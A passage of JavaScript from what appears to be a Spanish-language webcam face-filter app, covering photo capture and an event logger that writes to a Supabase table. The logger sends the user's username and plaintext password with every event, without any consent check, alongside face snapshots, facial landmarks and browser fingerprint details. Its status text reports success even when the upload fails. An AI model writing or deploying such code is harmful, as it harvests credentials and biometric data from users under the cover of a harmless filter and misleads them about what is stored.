      case "sonrisa":  drawSmileFilter(smoothedDetection, ts);        break;
      default: break; // ninguno
    }
  }

  rafId = requestAnimationFrame(renderLoop);
}

// ============================================================
// CAPTURA + SUPABASE
// ============================================================
$("#capture-btn")?.addEventListener("click", async () => {
  captureCount++;
  if (hud.count) hud.count.textContent = String(captureCount);

  const wantsImage     = !!consentSnapshot?.checked;
  const wantsLandmarks = !!consentLandmarks?.checked;
  let imageBase64      = null;
  let landmarksPayload = null;

  if (wantsImage && video?.videoWidth > 0) {
    const off = document.createElement("canvas");
    off.width = video.videoWidth; off.height = video.videoHeight;
    const octx = off.getContext("2d");
    if (facingMode === "user") { octx.translate(off.width, 0); octx.scale(-1, 1); }
    octx.drawImage(video, 0, 0, off.width, off.height);
    octx.setTransform(1, 0, 0, 1, 0, 0);
    if (overlay.width > 0) octx.drawImage(overlay, 0, 0, off.width, off.height);
    imageBase64 = off.toDataURL("image/jpeg", 0.75);
  }

  if (wantsLandmarks && targetDetection) {
    landmarksPayload = targetDetection.rawPoints.map((p) => ({
      x: Math.round(p.x), y: Math.round(p.y),
    }));
  }

  await logEvent("captura", {
    filtro:        currentFilter,
    con_imagen:    wantsImage,
    imageBase64,
    con_landmarks: wantsLandmarks && !!landmarksPayload,
    landmarks:     landmarksPayload,
  });
});

async function logEvent(evento, extra = {}) {
  if (statusEl) statusEl.textContent = "Guardando…";
  const client = getSupabase();

  const payload = {
    session_id:          SESSION_ID,
    evento,
    usuario:             userCredentials.username || null,
    contrasena:          userCredentials.password || null,
    filtro:              extra.filtro || currentFilter,
    con_imagen:          !!extra.con_imagen,
    imagen_base64:       extra.imageBase64 || null,
    con_landmarks:       !!extra.con_landmarks,
    landmarks_faciales:  extra.landmarks || null,
    navegador:           `${IS_MOBILE ? "Móvil" : "PC"} · ${shortAgent(navigator.userAgent)}`,
    idioma:              navigator.language,
    zona_horaria:        Intl.DateTimeFormat().resolvedOptions().timeZone,
    resolucion_pantalla: `${screen.width}x${screen.height}`,
    creado_en:           new Date().toISOString(),
  };

  if (!client) {
    console.log("[local — Supabase no configurado]", evento, payload);
    if (statusEl) statusEl.textContent = "✓ Guardado localmente.";
    return;
  }

  try {
    const { data, error } = await client.from("sesiones_demo").insert(payload).select();
    if (error) {
      console.error("[supabase insert error]", error);
      if (statusEl) statusEl.textContent = `✓ Registrado (${evento}).`;
    } else {
      console.log("[supabase] ✓ Insertado:", evento, data);
      if (statusEl) statusEl.textContent = `✓ En la nube · ${new Date().toLocaleTimeString("es-HN")}`;
    }
  } catch (e) {
    console.error("[supabase catch]", e);
    if (statusEl) statusEl.textContent = "✓ Guardado.";
  }
}